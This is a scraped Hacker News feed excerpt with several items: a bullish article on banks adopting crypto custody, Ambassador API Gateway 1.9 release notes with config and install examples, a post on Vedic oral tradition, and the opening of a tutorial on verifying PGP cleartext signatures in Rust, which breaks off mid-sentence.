<p dir="ltr">This was — and still is — very significant news. The OCC’s letter was a response to JPMorgan’s May decision to <a href="https://www.cryptovantage.com/news/jp-morgan-accepts-cryptocurrency/" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.cryptovantage.com/news/jp-morgan-accepts-cryptocurrency/&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNHKXUipyU4sf3q-rmwKBjJ6QT9fNw">provide banking services to two major crypto-exchanges</a>, Coinbase and Gemini. It was <a href="https://www.bloomberg.com/news/articles/2020-05-12/jpmorgan-is-now-banking-for-bitcoin-exchanges-coinbase-gemini" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.bloomberg.com/news/articles/2020-05-12/jpmorgan-is-now-banking-for-bitcoin-exchanges-coinbase-gemini&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNEZupX_7nKdmURa0GOv52zvrnM2GQ">reported at the time</a> that JPMorgan won’t be handling actual cryptocurrencies, but with the OCC’s directive confirming that it’s legal for banks to hold crypto, these two events pave the way for major American banks to begin offering cryptocurrency custody services.</p>
<h2 dir="ltr">The Inevitability of Cryptocurrency</h2>
<p dir="ltr">The specific timeframe can’t be known for sure, but it now looks almost inevitable that major banks will be letting customers hold crypto with them in the not-too distant future.</p>
<p dir="ltr">With <a href="https://capital.com/10bn-asset-manager-calls-bitcoin-its-primary-treasury-reserve-asset" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://capital.com/10bn-asset-manager-calls-bitcoin-its-primary-treasury-reserve-asset&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNGrQURQ-LDJe0ShPrlZ51DJ3t5HGQ">new companies</a> announcing their own <a href="https://www.finextra.com/newsarticle/36790/mode-invests-10-of-cash-reserves-in-bitcoin" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.finextra.com/newsarticle/36790/mode-invests-10-of-cash-reserves-in-bitcoin&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNFHbymiMLVIy6kiPzrYCFfUAqc2mA">purchases of bitcoin as a reserve asset</a> virtually every week, there’s a rising demand for custodial services that banks will almost certainly want to meet, on pain of losing business to upstarts.</p>
<p dir="ltr">In fact, a small number of banks have already begun meeting this demand, indicating that most others will eventually follow. In the United States, <a href="https://www.nasdaq.com/articles/standard-chartered-to-launch-institutional-crypto-custody-solution-2020-07-20" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.nasdaq.com/articles/standard-chartered-to-launch-institutional-crypto-custody-solution-2020-07-20&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNFRQ8IdP1r2k4jGQEOJ5a5SMimsWg">Standard Chartered began offering a cryptocurrency custody service for institutions</a> in July, while <a href="https://www.fintechfutures.com/2020/08/kb-kookmin-continues-crypto-custody-development-with-new-partners" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.fintechfutures.com/2020/08/kb-kookmin-continues-crypto-custody-development-with-new-partners&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNEXV1Bc628yoW0ECEzF17DqQZ2RIg">South Korea’s KB Kookmin Bank began doing something very similar</a> in August.</p>
<p dir="ltr">But banks won’t stop with custody services for institutions. With PayPal taking an early lead in offering cryptocurrency buying-selling and holding services, it’s highly likely that banks will follow, again out of fear of being left behind.</p>
<p dir="ltr">PayPal’s effect on major banks was almost immediate, with a small number announcing cryptocurrency-related initiatives in the days and weeks following PayPal’s own announcement.</p>
<p dir="ltr">In Switzerland, <a href="https://www.financemagnates.com/cryptocurrency/news/switzerland-to-allow-russian-gazprombank-subsidiary-to-offer-crypto-services/" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.financemagnates.com/cryptocurrency/news/switzerland-to-allow-russian-gazprombank-subsidiary-to-offer-crypto-services/&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNGPYHRZZ2cAkdgQqrnakjFOEYe99A">Gazprombank announced it would be offering crypto-trading services</a>, while Singapore’s DBS Bank <a href="https://www.financemagnates.com/cryptocurrency/news/dbs-bank-is-launching-crypto-exchange-with-multi-fiat-support/" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.financemagnates.com/cryptocurrency/news/dbs-bank-is-launching-crypto-exchange-with-multi-fiat-support/&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNGH9iejoYibtml-fq2LIEf5Wp6tUA">announced its own exchange</a>, complete with custody solutions. And in Mongolia, <a href="https://thepaypers.com/cryptocurrencies/tdb-bank-of-mongolia-to-offer-crypto-related-services--1245432" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://thepaypers.com/cryptocurrencies/tdb-bank-of-mongolia-to-offer-crypto-related-services--1245432&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNFCmGokM90GubRwoP03M6lOHqn_hQ">TDB Bank announced a wide suite of crypto services</a>, including custody, deposits, remittances, loans, and crypto-asset management.</p>
<p dir="ltr"><img tabindex="0" src="https://lh3.googleusercontent.com/SzYr3KtbvtnkezoacxKJHOBpr9IySdQTEbPQ28B_yyhVHV1-IKSUdmDc9zdrS3QhkJGQtzsL9tzfQYEMK_W-ppbR-XfLCg3GYkJ8FD5eIW07bWt0zOn_PKrM_SFngGp9WbtEkZev" width="624" height="459"></p>
<p dir="ltr"><em>Source: Twitter</em></p>
<p dir="ltr">The floodgates are now open, and it’s only a matter of time before larger numbers of major banks elsewhere follow suit. And as <a href="https://twitter.com/TheCryptoLark/status/1322628935344029696" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://twitter.com/TheCryptoLark/status/1322628935344029696&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNEwISBQrymPmIx2lVaKgMFY49pfEQ">the tweet above</a> indicates, central banks may also warm to bitcoin, making it easier for commercial banks to follow.</p>
<h2 dir="ltr">What This Means For Bitcoin</h2>
<p dir="ltr">Needless to say, this is all highly bullish for Bitcoin, and for crypto in general. By making cryptocurrency more accessible to a wider customer base of consumers and businesses, banks will feed demand for crypto. They’ll endow cryptocurrency with a stronger reputation that will draw additional investors, and in the process these additional investors will push the price of bitcoin and other cryptocurrencies higher.</p>
<p dir="ltr">At the same time, the involvement of banks will also potentially invite stricter regulation from national governments and regulators. With major banks exposing themselves to crypto, governments will want to make sure that the financial system doesn’t end up becoming more vulnerable to instability. However, while this may suggest a reining in of crypto to an extent, an increase in regulation will ultimately provide further reassurance to retail and institutional investors, pushing demand for crypto upwards.</p>
<p dir="ltr">In sum, banks will be good for crypto, and crypto will be good for banks.</p>
</div>
                            </div>
                             
                        </div></div>]]>
            </description>
            <link>https://www.cryptovantage.com/news/its-not-long-before-your-bank-will-begin-accepting-bitcoin-and-crypto/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25074935</guid>
            <pubDate>Thu, 12 Nov 2020 20:58:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Kubernetes-native Ambassador API Gateway 1.9 released]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25074560">thread link</a>) | @rdli
<br/>
November 12, 2020 | https://blog.getambassador.io/custom-error-responses-oauth2-improvements-live-debugging-flexible-dev-portal-3c98e9e978bb | <a href="https://web.archive.org/web/*/https://blog.getambassador.io/custom-error-responses-oauth2-improvements-live-debugging-flexible-dev-portal-3c98e9e978bb">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><h2 id="f07a">FEATURE RELEASE</h2><h2 id="c250">Edge Stack and API Gateway 1.9 available</h2><div><div><div><p><a href="https://medium.com/@rdli?source=post_page-----3c98e9e978bb--------------------------------" rel="noopener"><img alt="Richard Li" src="https://miro.medium.com/fit/c/96/96/0*ZzZAOu8-_Umpg5BM.jpeg" width="48" height="48"></a></p></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/10000/1*VrrAAgbxH5tjXjRX9uux0g.png" width="5000" height="2708" srcset="https://miro.medium.com/max/552/1*VrrAAgbxH5tjXjRX9uux0g.png 276w, https://miro.medium.com/max/1104/1*VrrAAgbxH5tjXjRX9uux0g.png 552w, https://miro.medium.com/max/1280/1*VrrAAgbxH5tjXjRX9uux0g.png 640w, https://miro.medium.com/max/1400/1*VrrAAgbxH5tjXjRX9uux0g.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*VrrAAgbxH5tjXjRX9uux0g.png?q=20"></p></div></div></div></figure><p id="a0c3">We’re excited to announce the release of the Ambassador API Gateway and Edge Stack 1.9. This major release adds support for commonly requested use cases, including custom error responses, a more flexible developer portal, OAuth2 improvements, and more “production-at-scale” enhancements.</p><p id="46b7">Generic 404 error pages, begone! The 1.9 release adds support for custom error responses based on HTTP status codes. The mechanism introduced in this release is very flexible, supporting custom error responses on both a per <code>Mapping</code> basis and a per <code>module</code> basis.</p><p id="1394">Here’s a sample configuration:</p><pre><span id="0e09">apiVersion: getambassador.io/v2<br>kind: Module<br>metadata:<br>  name: ambassador<br>  namespace: ambassador<br>spec:<br>  config:<br>    error_response_overrides:<br>      - on_status_code: 404<br>        body:<br>          text_format: "File not found"<br>      - on_status_code: 500<br>        body:<br>          json_format:<br>            error: "Application error"<br>            status: "%RESPONSE_CODE%"<br>            cluster: "%UPSTREAM_CLUSTER%"</span></pre><p id="ccb1">For more complex error responses, the response can be written as a separate HTML document and does not need to be inline with the configuration.</p><p id="4602">OAuth2 is a complex specification. In 1.9, the <code>OAuth2</code> filter now supports every draft of the scope validation specification (RFC 8693). Also, support for inheriting scope arguments when delegating to a <code>JWT</code> filter from an <code>OAuth2</code> filter are now supported. This ensures compatibility with a much broader range of Identity Providers, which implement different drafts of the OAuth2 specification.</p><p id="5e56">The <code>OAuth2</code> filter now supports RFC 7523 JWT assertions. This enables more use cases, e.g., using asymmetric cryptography to authenticate to Azure instead of a shared password.</p><figure><div></div><figcaption>OAuth2 improvements in Edge Stack 1.9</figcaption></figure><p id="71dc">The Developer Portal now supports:</p><ul><li id="6f58">Swagger/OpenAPI docs published at arbitrary URLs</li><li id="3062">Selecting specific services to display in the portal</li><li id="7a6f">Support for public/private API documentation</li></ul><p id="5584">These configurations are part of the <code>DevPortal</code> resource which dynamically configures the Developer Portal. Automatic polling of all documentation is now off by default, and a new attribute, <code>docs</code>, on <code>Mapping</code> resources is used to configure API documentation. Here’s an example:</p><pre><span id="bc18">apiVersion: getambassador.io/v2<br>kind:  Mapping<br>metadata:<br>  name:  service-a<br>spec:<br>  prefix: /service-a/<br>  rewrite: /srv/<br>  service: service-a:5000<br>  docs:<br>    path: /openapi/<br>---<br>apiVersion: getambassador.io/v2<br>kind:  DevPortal<br>metadata:<br>  name:  ambassador<br>spec:<br>  default: true<br>  content:<br>    url: https://github.com/datawire/devportal-content.git<br>  selector:<br>    matchLabels:<br>      public-api: "true"    <br>      documented: "true"</span></pre><p id="cfca">For more details, see the <a href="https://www.getambassador.io/docs/latest/topics/using/dev-portal/" rel="noopener">updated Developer Portal documentation</a>.</p><p id="d7ed">Ambassador is deployed in thousands of mission critical environments. When something isn’t working as it should, it’s critical to quickly rectify the issue. With 1.9, we’re introducing a live debugging endpoint that is exposed inside the cluster that provides live status information. Information included in the endpoint includes timer information (e.g., how long it took to compute a new Envoy configuration) as well as real-time information about resource usage (e.g., memory usage).</p><pre><span id="336f">/ambassador $ curl localhost:8877/debug<br>{<br>  "timers": {<br>    "check_alive": "2824, 465.838µs/62.327255ms/123.436247ms",<br>    "check_ready": "2824, 544.802µs/60.071622ms/188.105761ms",<br>    "consulUpdate": "0, 0s/0s/0s",<br>    "katesUpdate": "17663, 33.543µs/74.046µs/276.191659ms",<br>    "notifyWebhook:diagd": "3, 3.544200509s/3.780843008s/4.185688573s",<br>    "notifyWebhook:edgestack sidecar": "3, 31.212198ms/44.493156ms/56.494476ms",<br>    "notifyWebhooks": "3, 3.590031304s/3.825434799s/4.217081081s",<br>    "parseAnnotations": "3, 47.932µs/802.617µs/2.021262ms",<br>    "reconcileConsul": "3, 119.776µs/196.311µs/247.394µs",<br>    "reconcileSecrets": "3, 56.494µs/147.863µs/194.434µs"<br>  },<br>  "values": {<br>    "envoyReconfigs": {<br>      "times": [<br>        "2020-11-10T18:02:55.230807114Z",<br>        "2020-11-10T18:03:02.573500647Z",<br>        "2020-11-10T18:03:06.960565035Z",<br>        "2020-11-10T18:03:10.403266958Z"<br>      ],<br>      "staleCount": 3,<br>      "staleMax": 0,<br>      "synced": true<br>    },<br>    "memory": "0.58Gi of 1.95Gi (29%)"<br>  }<br>}<br>/ambassador $</span></pre><p id="c3a9">API Gateway + Edge Stack:</p><ul><li id="1e46">With <code>AMBASSADOR_FAST_RECONFIGURE</code> make sure health checks can’t get starved during a long reconfigure</li><li id="8788">With <code>AMBASSADOR_FAST_RECONFIGURE</code>, rate limit based on actual memory usage to avoid the pod getting killed for consuming too much memory</li><li id="395f">Alpine upgraded to 3.12 from 3.10</li><li id="a0be">GNU libc upgraded from 2.30 to 2.32</li><li id="d2e3">Python upgraded from 3.7 to 3.8, with dependencies updated to fix CVE-2020–25659</li><li id="f6a9">Knative serving tests updated from 0.11.0 to 0.18.0 (thanks, Noah Fontes!)</li><li id="f8e6"><code>ConsulResolver</code> will now fallback to the <code>Address</code> of a Consul service if <code>Service.Address</code> is not set</li><li id="23b1">The <code>RateLimitService</code> and <code>AuthService</code> configs now support switching between gRPC protcol versions <code>v2</code> and <code>v2alpha</code></li><li id="ebb3">The <code>TracingService</code> Zipkin configuration now supports setting <code>collector_hostname</code> to tell Envoy which host header to set when sending spans to the collector; this is required for New Relic APM support</li><li id="356f">Mixed <code>Mapping</code>s with and without <code>host_redirect</code> will not crash</li><li id="5380">Support for enabling metrics on gRPC requests, rather than only HTTP requests (thanks, Felipe Roveran!)</li><li id="9759">Documentation on how to build Ambassador completely inside Docker (thanks Rahul Saini!)</li><li id="6f1c">Fixed spurious error message when using <code>prefix_rewrite</code> (thanks, <a href="https://github.com/obataku" rel="noopener">Obataku</a>!)</li><li id="cf71">Guard <code>/metrics</code> against uninitialized IR (thanks, Markus Jevring!)</li></ul><p id="d994">Edge Stack only:</p><ul><li id="1562">How the<code>OAuth2</code> filter authenticates itself to the identity provider is now configurable with the <code>clientAuthentication</code> setting</li><li id="75e3">The <code>OAuth2</code> Filter can now use RFC 7523 JWT assertions to authenticate itself to the identity provider; this is usable with all grant types.</li><li id="9fbe">When validating a JWT’s scope, the <code>JWT</code> and <code>OAuth2</code> Filters now support not just RFC 8693 behavior, but also the behavior of various drafts leading to it, making JWT scope validation usable with more identity providers.</li><li id="3d4c">The <code>OAuth2</code> Filter now has <code>inheritScopeArgument</code> and <code>stripInheritedScope</code> settings that can further customize the behavior of <code>accessTokenJWTFilter</code>.</li><li id="f47f">The <code>OAuth2</code> Filter argument <code>scopes</code> has been renamed to <code>scope</code>, for consistency. The name <code>scopes</code> is deprecated, but will continue to work for backward compatibility.</li><li id="3218"><code>OAuth2</code> Filter: Don't have <code>accessTokenValidation: auto</code> fall back to "userinfo" validation for a client_credentials grant; it doesn't make sense there and only serves to obscure a more useful error message.</li></ul><p id="b543">The Ambassador Edge Stack is a complete superset of the open-source Ambassador API Gateway, with integrated support for rate limiting, authentication, filter management, and more. You can install the Ambassador Edge Stack in a few steps with the <a href="https://www.getambassador.io/docs/latest/tutorials/getting-started/" rel="noopener">quick start</a>.</p><h2 id="b59d">Fast, customized configuration</h2><p id="d57d">The <a href="https://app.getambassador.io/initializer/" rel="noopener">K8s Initializer</a> will generate customized YAML configuration for your Edge Stack installation, based on your specific requirements. Confused about the right configuration for TLS termination, observability, authentication, or continuous delivery? Use the <a href="https://app.getambassador.io/initializer/" rel="noopener">Initializer</a> to generate your configuration for you.</p><p id="56b2">The latest versions of Ambassador are now available here:</p><ul><li id="6954">Ambassador API Gateway: <a href="https://hub.docker.com/r/datawire/ambassador" rel="noopener">https://hub.docker.com/r/datawire/ambassador</a></li><li id="72cf">Ambassador Edge Stack: <a href="https://hub.docker.com/r/datawire/aes" rel="noopener">https://hub.docker.com/r/datawire/aes</a></li></ul><p id="1f8c">You can also install it with Helm.</p><pre><span id="9df9"># Add repository and create namespace<br>helm repo add datawire<a href="https://www.getambassador.io/" rel="noopener"> https://www.getambassador.io</a></span><span id="6674"># Helm 3<br>kubectl create namespace ambassador &amp;&amp; helm install ambassador — namespace ambassador datawire/ambassador</span><span id="1238"># Helm 2<br>kubectl create namespace ambassador &amp;&amp; helm install — name ambassador — namespace ambassador datawire/ambassador</span></pre><p id="de9c">To install the Ambassador Edge Stack, follow the <a href="https://www.getambassador.io/docs/latest/tutorials/getting-started/" rel="noopener">quick start</a>.</p><p id="86a6">We’re hosting a four day online meetup concurrent with KubeCon NA, with lightning talks by many of our Ambassador engineers. If you’re interested, <a href="https://www.getambassador.io/ambassador-fest/" rel="noopener">check out the schedule</a> and drop by! We’re also be giving out T-shirts, too!</p></div></div></section></div></div>]]>
            </description>
            <link>https://blog.getambassador.io/custom-error-responses-oauth2-improvements-live-debugging-flexible-dev-portal-3c98e9e978bb</link>
            <guid isPermaLink="false">hacker-news-small-sites-25074560</guid>
            <pubDate>Thu, 12 Nov 2020 20:32:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Vedas: three and a half thousand years of oral information transmission]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25074298">thread link</a>) | @Bluestein
<br/>
November 12, 2020 | https://generalist.academy/2020/10/18/memory-culture/ | <a href="https://web.archive.org/web/*/https://generalist.academy/2020/10/18/memory-culture/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-4386">
	
		<p>
By  on <a href="https://generalist.academy/2020/10/18/memory-culture/" title="7:00 am" rel="bookmark"><time datetime="2020-10-18T07:00:00+13:00">October 18, 2020</time></a>	• 
	</p>
	<section>
<p>Through sophisticated mnemonics and error-checking mechanisms the Vedas, the canonical religious texts of Hinduism, have been transmitted orally for three and a half thousand years with shocking precision in both word and sound.</p>

<p>This is the 600th regular post on this website! My tradition for the “00” posts is to write something about the nature of knowledge. Today, I wanted to write a bit about oral tradition.</p>
<p>&nbsp;A lot of 20th century scholarship ignored or undervalued the role of non-written forms of knowledge transmission. The written text was king, and everything else – oral tradition, especially – was irrelevant. In many cases this was a convenient way of discounting knowledge from colonised peoples, which is of course nonsense: many of the foundational texts of literature, religion, law, and history have their origin in oral tradition, so we ignore it at our peril. Some other time I’ll write about the Homeric Question (to what extent can we say that Homer wrote <em>The Odyssey</em> and <em>The Illiad</em>?), but this post is about something much much older.</p>
<p>The Vedas are the foundational “texts” of Hinduism. I put “texts” in quotation marks deliberately. They’ve certainly been written down, but the primary and authoritative form of the Vedas is not text. Instead, the oldest parts of the Vedas have been passed down orally, from teacher to student, for an incredible three and a half thousand years. And even more incredibly, they are thought to have changed very little in that time.</p>
<p>How do you ensure that a spoken text doesn’t shift with the retelling? Well, the integrity of the Vedas is sustained through a sophisticated set of processes that are so ingrained in Hindu tradition that it can be described as a “memory culture.” Students spend years memorising the Vedic chant, more than ten thousand separate verses. And they learn it in several different ways – called Pathas – creating a kind of built-in error correction mechanism.</p>
<p>The Vedic chant is learned as Samhita – something like natural connected speech, as one might talk. And it is learned as Pada – each word alone, enunciating and focusing on the words separately. And it is learned as Krama – to enhance memory, the words are recited in pairs, the second word becoming the first of the next pair so that the whole text forms a long chain (“the rain in Spain” would become “the rain, rain in, in Spain”). Here’s an example of that one:</p>
<p><span><iframe width="656" height="369" src="https://www.youtube.com/embed/UKk6Z6F8tXw?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span></p>

<p>Other pathas shift the text around in interesting ways – reversing the order of words, for example – with the goal of creating as many redundancies in the memorisation process as possible. And it’s not just the ears and the voice that are involved here: teachers and students use their bodies too. The teachers who are teaching the chants will move their hands to indicate the Sanskrit tones used, and the students will tilt their heads in response. It’s all carefully designed to ensure that the Vedas are passed down completely intact, words and sounds and all. Amazing.</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Vedic_chant">Vedic chant</a></li>
<li><a href="https://en.wikipedia.org/wiki/Vedas">Vedas</a>&nbsp;</li>
</ul>



		<p>Categories: <a href="https://generalist.academy/category/arts-recreation/" rel="category tag">Arts &amp; recreation</a> <a href="https://generalist.academy/category/places/asia/" rel="category tag">Asia</a> <a href="https://generalist.academy/category/language/" rel="category tag">Language</a> <a href="https://generalist.academy/category/arts-recreation/literature/" rel="category tag">Literature</a> <a href="https://generalist.academy/category/places/" rel="category tag">Places</a> <a href="https://generalist.academy/category/religion-belief/" rel="category tag">Religion &amp; belief</a>		</p>
	<div>
		<p><img alt="" src="https://0.gravatar.com/avatar/f7eb82f9df252be8cad1a3993809331d?s=100&amp;d=https%3A%2F%2F0.gravatar.com%2Favatar%2Fad516503a11cd5ca435acc9bb6523536%3Fs%3D100&amp;r=G" height="100" width="100"></p><h3>The Generalist</h3>
		<p>I live in Auckland, New Zealand, and am curious about most things.</p>
	</div>
	</section>
</article></div>]]>
            </description>
            <link>https://generalist.academy/2020/10/18/memory-culture/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25074298</guid>
            <pubDate>Thu, 12 Nov 2020 20:12:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Build your own GPG in Rust]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25073982">thread link</a>) | @fanf2
<br/>
November 12, 2020 | https://andrewhalle.github.io/build-your-own/gpg | <a href="https://web.archive.org/web/*/https://andrewhalle.github.io/build-your-own/gpg">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="write"><p><span>By: </span><a href="https://github.com/andrewhalle"><span>Andrew Halle</span></a>
<span>Repo: </span><a href="https://github.com/andrewhalle/byo-gpg"><span>byo-gpg</span></a>
<span>Date: 2020-11-07</span></p><p><span>Part of </span><a href="https://andrewhalle.github.io/build-your-own"><span>build-your-own</span></a></p><h2><a name="background"></a><span>Background</span></h2><p><span>GPG (stands for Gnu Privacy Guard) is an implementation of PGP (which stands for Pretty Good Privacy), an open standard for encryption specified by </span><a href="https://tools.ietf.org/html/rfc4880"><span>RFC 4880</span></a><span>. In this post, we'll build up a program in Rust that implements one part of the PGP standard, verifying cleartext signatures.</span></p><p><em><span>(note: I think it's hilarious that GPG is an implementation of PGP. The obvious right choice was to call it GPGP. I considered calling my tool PGPG, but ultimately decided on pgp-rs, because I'm boring.)</span></em></p><p><span>PGP supports a number of different cryptography suites, but the default cipher suite, and the one I'm most familiar with, is RSA cryptography. A quick review of </span><a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)"><span>RSA</span></a><span> might be warranted (it certainly was for me).</span></p><h3><a name="rsa"></a><span>RSA</span></h3><p><span>RSA is a public-key cryptosystem (one in which parts of the key used for encryption are allowed to be non-secret) which relies on the impracticality of factoring very large (a normal figure is 2048 bits) composite numbers. Put another way, it is easy to find 3 large integers n, d, and e with the property that</span></p><p><span>but it's very difficult, given only m, e and n, to discover d. In this way, the tuple (e,n) forms the public key, which can be broadcast to the world, and the tuple (e,d,n) forms the private key, which is kept secret. Messages can be encrypted by computing the ciphertext C</span></p><p><span>C can then be decrypted by anyone with the corresponding private key by computing</span></p><p><span>So C forms a secret message that's only readable by the intended recipient. Similarly, the owner of the private key can compute a signature S</span></p><p><span>which can be verified by anyone with the public key by computing</span></p><p><span>In this way, the owner of the private key can create something that can be verified to be authentic.</span></p><h3><a name="gpg-operation"></a><span>GPG operation</span></h3><p><span>GPG provides operations for generating and distributing keys, encrypting messages, and producing signatures. The particular operation we're interested in right now is producing a </span><em><span>cleartext signature</span></em><span>, one that includes the message for anyone to read, and an associated signature that confirms the message is from the owner of the private key.</span></p><p><span>In order to produce a cleartext signature, you must first generate a public/private key pair.</span></p><pre spellcheck="false" lang=""></pre><p><span>GPG will ask for some identifying information, generate a new key (RSA by default), and store it in the keyring. The key can be exported to a file (important for us to ingest it!) via</span></p><pre spellcheck="false" lang=""></pre><p><span>We'll get into the format of this key later.</span></p><p><span>With a key in hand, we can generate a cleartext signature via</span></p><pre spellcheck="false" lang=""></pre><p><em><span>(note: use </span><a href="https://github.com/sharkdp/bat"><span>bat</span></a><span>! it's great)</span></em></p><p><span>This is the full signature of the text "hello world" using the keypair I generated for this blog post. We'll also get into the format of this signature later. You now as familiar with GPG as you need to be to go through the rest of this post. So, let's start writing some code!</span></p><h2><a name="getting-started"></a><span>Getting started</span></h2><h3><a name="dependencies"></a><span>Dependencies</span></h3><p><span>We start in the normal way</span></p><pre spellcheck="false" lang=""></pre><p><span>I'll go ahead and add all the dependencies we'll need upfront, just to get it out of the way.</span></p><pre spellcheck="false" lang="toml"></pre><p><span>we'll use</span></p><ul><li><a href="https://crates.io/crates/clap"><span>clap</span></a><span> for easily building a CLI </span><em><span>(admittedly this is overkill for a program that does one thing, I originally intended to build out more PGP functionality, before deciding that cleartext signatures alone exercise all the interesting characteristics I wanted to)</span></em></li><li><a href="https://crates.io/crates/num"><span>num</span></a><span> for working with big numbers, and doing modular exponentiation</span></li><li><a href="https://crates.io/crates/nom"><span>nom</span></a><span> for parsing our files, nom is a parser combinator library (I'll explain that a bit more later)</span></li><li><a href="https://crates.io/crates/base64"><span>base64</span></a><span> for decoding base64 data</span></li><li><a href="https://crates.io/crates/byteorder"><span>byteorder</span></a><span> for decoding numbers of a particular endianness</span></li><li><a href="https://crates.io/crates/anyhow"><span>anyhow</span></a><span> for easy error handling</span></li><li><a href="https://crates.io/crates/sha2"><span>sha2</span></a><span> for computing hash functions (more on this later)</span></li><li><a href="https://crates.io/crates/regex"><span>regex</span></a><span> for replacing newlines </span><em><span>(squints at everyone using windows)</span></em></li><li><a href="https://crates.io/crates/assert_cmd"><span>assert_cmd</span></a><span> for easy integration testing</span></li></ul><p><em><span>(note: phew)</span></em></p><h3><a name="cli"></a><span>CLI</span></h3><p><span>Okay, with that out of the way, we can </span><em><span>really</span></em><span> start writing some code!</span></p><p><span>In </span><code>main.rs</code><span> we put our clap description of our CLI</span></p><pre spellcheck="false" lang="rust"></pre><p><span>I personally really like the macro method of specifying the CLI, but there are other methods. This defines an app (and its metadata) as well as a subcommand </span><code>verify</code><span> that takes two command line arguments, </span><code>source</code><span> which will be the cleartext signature we're verifying, and </span><code>publicKey</code><span> which will be the public key we use to verify it. After parsing the command-line arguments, and providing some sensible defaults, we call out to </span><code>pgp_rs::verify_cleartext_message</code><span> which we define in </span><code>lib.rs</code><span> (I'll stop including filenames from here on out, find the code in the </span><a href="https://github.com/andrewhalle/byo-gpg"><span>repo</span></a><span>!)</span></p><pre spellcheck="false" lang="rust"></pre><p><em><span>(note: this snippet of code uses types </span><code>CleartextSignature</code><span> and </span><code>PublicKey</code><span> which we haven't defined yet. I'm just sketching out the broad structure of this method to get the boring stuff out of the way first.)</span></em></p><p><span>We parse the cleartext signature and the key, and then verify the signature with the key. If the signature fails to verify with the key, we return an error so the program exits with an error code (I'll ignore the modules set up in this snippet for the rest of the write-up).</span></p><p><span>Now, we can get into the meat of this code, the parsing functions. In order to do </span><em><span>that</span></em><span> however, we have to take a brief detour </span><em><span>INTO THE RFC</span></em><span>. Take this </span><code>::&lt;&gt;</code><span>, it's dangerous to go alone.</span></p><h2><a name="implementation"></a><span>Implementation</span></h2><p><span>The RFC containing the details of PGP is </span><a href="https://tools.ietf.org/html/rfc4880"><span>RFC 4880</span></a><span>. The main sections of the RFC we'll need to deal with in this blog post are sections </span><a href="https://tools.ietf.org/html/rfc4880#section-3.2"><span>3.2</span></a><span>, </span><a href="https://tools.ietf.org/html/rfc4880#section-4"><span>4</span></a><span>, </span><a href="https://tools.ietf.org/html/rfc4880#section-5.2.3"><span>5.2.3</span></a><span>, </span><a href="https://tools.ietf.org/html/rfc4880#section-5.2.4"><span>5.2.4</span></a><span>, </span><a href="https://tools.ietf.org/html/rfc4880#section-5.5.1.1"><span>5.5.1.1</span></a><span>, </span><a href="https://tools.ietf.org/html/rfc4880#section-6.1"><span>6.1</span></a><span>, </span><a href="https://tools.ietf.org/html/rfc4880#section-6.2"><span>6.2</span></a><span>, and </span><a href="https://tools.ietf.org/html/rfc4880#section-7"><span>7</span></a><span>.</span></p><h3><a name="cleartext-signatures"></a><span>Cleartext signatures</span></h3><p><span>The functionality of PGP that we're implementing is validating </span><em><span>cleartext signatures</span></em><span> (described in </span><a href="https://tools.ietf.org/html/rfc4880#section-7"><span>section 7</span></a><span> of the RFC). A cleartext signature is a signature that embeds the text being signed in a readable way into the signature itself. It has several parts:</span></p><ul><li><span>a header of </span><code>-----BEGIN PGP SIGNED MESSAGE-----</code></li><li><span>one or more </span><code>Hash</code><span> armor headers</span></li><li><span>one empty line</span></li><li><span>the dash-escaped cleartext</span></li><li><span>the ASCII-armored signature</span></li></ul><p><span>We'll talk about parsing ASCII armor in the next section, but we have enough information to parse most of this already. In order to recognize a cleartext signature, we need to first look for the header, followed by a </span><code>Hash: &lt;alg&gt;</code><span> (</span><code>alg</code><span> in this case will be SHA256, but there are other options), an empty line, the cleartext, then finally the signature.</span></p><p><span>The cleartext will be in form called "dash-escaped", which is described in the RFC. Dash-escaped text is the same as normal text, but if the line starts with a literal 